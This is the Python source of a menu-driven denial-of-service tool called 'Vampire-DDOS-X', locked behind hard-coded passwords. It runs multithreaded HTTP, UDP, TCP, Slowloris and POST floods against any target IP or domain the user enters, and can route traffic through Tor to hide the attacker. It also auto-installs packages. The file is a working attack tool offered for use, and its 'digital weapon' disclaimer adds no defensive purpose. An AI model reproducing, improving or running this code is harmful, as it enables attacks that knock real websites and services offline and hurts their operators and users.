# ---- AUTO INSTALL & IMPORT ----
import os
import sys
import time
import socket
import threading
import random
import subprocess
import getpass
from colorama import Fore, Style, init
import socks
import hashlib

# Auto-install required modules
def install(module, pip_name=None):
    pip_name = pip_name or module
    try:
        __import__(module)
    except ImportError:
        subprocess.call([sys.executable, '-m', 'pip', 'install', pip_name])

install("colorama")
install("socks", "pysocks")

init(autoreset=True)

# ---- PASSWORD CONFIG ----
MASTER_PASSWORD = "VampireX"  # Master Script Password
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# ---- GLOBAL STATE ----
requests_sent = 0
threads_running = 0
attack_active = True
admin_mode = False

# ---- BANNERS ----
admin_banner = f"""{Fore.RED}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ ADMIN PANEL ▒▒▒█████         ║
║   [Vampire-DDOS-X] by Muhammad Shourov      ║
╚══════════════════════════════════════════════╝
"""

user_banner = f"""{Fore.CYAN}
╔══════════════════════════════════════════════╗
║       █████▒▒▒ USER PANEL ▒▒▒█████          ║
║     [Vampire-DDOS-X] by Muhammad Shourov    ║
╚══════════════════════════════════════════════╝
"""

# ---- MASTER LOGIN ----
def authenticate():
    print(f"{Fore.YELLOW}[!] Password Required to Launch Vampire-DDOS-X Tool")
    for _ in range(3):
        password = getpass.getpass("Enter Master Password: ")
        if password == MASTER_PASSWORD:
            print(f"{Fore.GREEN}[✓] Access Granted!")
            return True
        else:
            print(f"{Fore.RED}[!] Incorrect Password")
    print(f"{Fore.RED}[-] Too many failed attempts. Exiting...")
    sys.exit()

# ---- DISCLAIMER ----
def show_disclaimer():
    from itertools import cycle
    colors = cycle([
        Fore.RED, Fore.LIGHTRED_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX,
        Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.CYAN, Fore.LIGHTCYAN_EX
    ])
    text_lines = [
        "╔════════════════════════════════════════════════════════════════╗",
        "║ WARNING: This tool is a DIGITAL WEAPON.                       ║",
        "║ Unauthorized use can lead to SERIOUS LEGAL CONSEQUENCES.     ║",
        "║ Use responsibly with full permission.                         ║",
        "║ Developed by: Muhammad Shourov aka VAMPIRE                   ║",
        "╚════════════════════════════════════════════════════════════════╝"
    ]
    for line in text_lines:
        color = next(colors)
        for char in line:
            sys.stdout.write(color + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(0.002)
        print()
        time.sleep(0.05)

# ---- TOR ENABLE ----
def install_tor():
    try:
        subprocess.call(['pkg', 'install', '-y', 'tor'])
    except:
        print("[!] TOR installation failed.")

def enable_tor():
    print("[?] Enable Anonymous Mode (TOR)? (y/n): ", end='')
    if input().lower() == 'y':
        password = getpass.getpass("Enter TOR password: ")
        if password == TOR_PASSWORD:
            print("[✓] Enabling TOR routing...")
            install_tor()
            os.system("tor &")
            time.sleep(5)
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            print("[✓] TOR routing enabled.")
        else:
            print("[!] Wrong TOR password. Skipping...")

# ---- PAYLOAD GENERATOR ----
def generate_payload(size=1024):
    return random._urandom(size)

# ---- ATTACK ENGINE ----
def attack(target, port, attack_type):
    global requests_sent, threads_running, attack_active
    threads_running += 1
    try:
        while attack_active:
            try:
                if attack_type == "2":  # UDP
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(generate_payload(1024), (target, port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    if attack_type == "1":  # HTTP
                        req = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
                        s.send(req.encode())
                    elif attack_type == "3":  # SYN
                        s.send(generate_payload(2048))
                    elif attack_type == "4":  # Slowloris
                        for _ in range(50):
                            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                            time.sleep(0.5)
                    elif attack_type == "5":  # POST
                        payload = "username=admin&password=admin"
                        headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"
                        s.send(headers.encode())
                requests_sent += 1
                if requests_sent % 100 == 0:
                    print(f"[+] Sent {requests_sent} requests to {target}:{port}")
            except:
                break
    finally:
        threads_running -= 1

def start_attack(target, port, attack_type):
    threads = 100 if admin_mode else 50
    print(f"[!] Starting attack with {threads} threads...")
    for _ in range(threads):
        threading.Thread(target=attack, args=(target, port, attack_type)).start()

# ---- MAIN ----
def main():
    authenticate()
    show_disclaimer()

    global admin_mode
    password = getpass.getpass("[?] Enter Admin Mode Password (or press Enter to continue as user): ")
    if password == ADMIN_PASSWORD:
        print(Fore.GREEN + "[✓] Admin Mode Enabled!")
        admin_mode = True
        print(admin_banner)
    else:
        print(Fore.CYAN + "[!] Continuing in User Mode...")
        print(user_banner)

    enable_tor()

    while True:
        print(f"{Fore.GREEN}[1] HTTP Flood")
        print(f"{Fore.GREEN}[2] UDP Flood")
        print(f"{Fore.GREEN}[3] SYN Flood")
        print(f"{Fore.GREEN}[4] Slowloris")
        print(f"{Fore.GREEN}[5] POST Flood")
        print(f"{Fore.RED}[0] Exit")
        choice = input("Choose attack type (0-5): ")

        if choice == "0":
            print("[*] Exiting...")
            break

        target = input("Enter target IP or Domain: ")
        port = int(input("Enter port number: "))
        start_attack(target, port, choice)

if __name__ == "__main__":
    main()
